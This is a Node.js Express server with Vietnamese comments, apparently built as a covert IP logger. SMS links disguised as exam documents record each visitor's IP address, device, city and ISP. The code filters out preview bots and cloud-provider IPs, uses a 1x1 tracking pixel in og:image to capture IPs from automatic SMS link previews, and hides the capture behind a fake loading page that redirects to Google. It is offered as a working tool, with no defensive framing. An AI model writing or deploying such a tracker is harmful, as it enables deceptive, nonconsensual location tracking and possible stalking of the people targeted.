const express = require('express');
const app = express();

// Hàm lấy thông tin IP (Vị trí, Nhà mạng)
async function getIPInfo(ip) {
  try {
    // Dùng API miễn phí ip-api.com (Hỗ trợ HTTP, không dùng HTTPS để tránh lỗi free tier)
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,as,query`);
    const data = await res.json();
    if (data.status === 'success') {
      return {
        location: `📍 Vị trí: ${data.city}, ${data.regionName} (${data.country})`,
        isp: `${data.isp}`,
        org: `${data.org} | ${data.as}`,
        isProxy: /google|apple|cloudflare|zalo|facebook|microsoft|amazon|vng/i.test(data.isp + data.org)
      };
    }
  } catch (e) {}
  return { location: "📍 Không rõ vị trí", isp: "Không rõ", org: "Không rõ", isProxy: false };
}

// Hàm lấy IP thật (Xử lý qua Proxy của Render)
function getRealIP(req) {
  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
}

// Hàm phân tích Thiết bị
function getDevice(userAgent) {
  if (/iphone|ipad|ipod/i.test(userAgent)) return "iPhone / iPad (iOS)";
  if (/android/i.test(userAgent)) return "Điện thoại (Android)";
  if (/macintosh|mac os x/i.test(userAgent)) return "MacBook (macOS)";
  if (/windows/i.test(userAgent)) return "Máy tính (Windows)";
  return "Thiết bị khác";
}

// 1. TRANG CHỦ (Kiểm tra server sống)
app.get('/', (req, res) => {
  res.send("Server đang chạy. Hãy gửi link /bai-thi/... để test.");
});

// 2. TRANG BẪY CHÍNH (Gửi link này qua SMS)
app.get('/bai-thi/:id', async (req, res) => {
  const ip = getRealIP(req);
  const userAgent = req.headers['user-agent'] || '';
  const ipInfo = await getIPInfo(ip);

  // KIỂM TRA XEM CÓ PHẢI BOT/PROXY KHÔNG (Dựa vào User-Agent và Nhà mạng)
  const uaBot = /googlebot|applebot|zalo|facebook|telegrambot|bot|crawler|inspection/i.test(userAgent);
  const isBot = uaBot || ipInfo.isProxy;

  // Nếu là Bot/Proxy quét link (Zalo, Google, Apple...)
  if (isBot) {
    // Trả về HTML có chứa thẻ ảnh bẫy 1x1 pixel
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Tài liệu bài thi</title>
        <meta property="og:title" content="Tài liệu bài thi">
        <meta property="og:image" content="https://ip-logger-yanx.onrender.com/bay.png?id=${req.params.id}">
      </head>
      <body>Đang tải dữ liệu...</body>
      </html>
    `);
  }

  // NẾU LÀ NGƯỜI THẬT BẤM LINK
  console.log(`\n🚨🚨🚨 [CÓ NGƯỜI THẬT BẤM VÀO LINK!] 🚨🚨🚨`);
  console.log(`🆔 Mã ID: ${req.params.id}`);
  console.log(`🌐 Địa chỉ IP: ${ip}`);
  console.log(`📱 Thiết bị: ${getDevice(userAgent)}`);
  console.log(`${ipInfo.location}`);
  console.log(`📡 Nhà mạng: ${ipInfo.isp}`);
  console.log(`==================================================\n`);

  // Hiển thị trang Loading 3 giây để giữ chân họ
  res.send(`
    <!DOCTYPE html>
    <html lang="vi">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Đang tải tài liệu...</title>
      <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f9; }
        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px;}
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container { text-align: center; }
      </style>
      <script>
        setTimeout(function(){ window.location.href = "https://www.google.com"; }, 3000);
      </script>
    </head>
    <body>
      <div class="container">
        <div class="loader" style="margin: 0 auto 20px auto;"></div>
        <h2>Đang tải tài liệu bài thi...</h2>
        <p>Vui lòng đợi trong giây lát.</p>
      </div>
    </body>
    </html>
  `);
});

// 3. ĐƯỜNG DẪN ẢNH BẪY (Hứng IP khi Android tự động tải preview SMS)
app.get('/bay.png', async (req, res) => {
  const ip = getRealIP(req);
  const userAgent = req.headers['user-agent'] || '';
  const id = req.query.id || 'Không rõ';

  // Trả về ảnh trong suốt 1x1 pixel
  const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 'base64');
  res.set('Content-Type', 'image/png');
  res.send(pixel);

  // Kiểm tra thông tin IP
  const ipInfo = await getIPInfo(ip);

  // Nếu IP là của Google/Apple/Cloudflare -> Đây là Bot tải ảnh preview hộ -> Bỏ qua không báo log
  if (ipInfo.isProxy) {
    return; // Âm thầm bỏ qua
  }

  // Nếu IP thật -> In log ra màn hình Render
  console.log(`\n📱📱📱 [BẮT ĐƯỢC IP QUA SMS PREVIEW!] 📱📱📱`);
  console.log(`🆔 Mã ID: ${id}`);
  console.log(`🌐 Địa chỉ IP: ${ip}`);
  console.log(`📱 Thiết bị: ${getDevice(userAgent)}`);
  console.log(`${ipInfo.location}`);
  console.log(`📡 Nhà mạng: ${ipInfo.isp}`);
  console.log(`==================================================\n`);
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log("Server đang chạy trên cổng " + port));
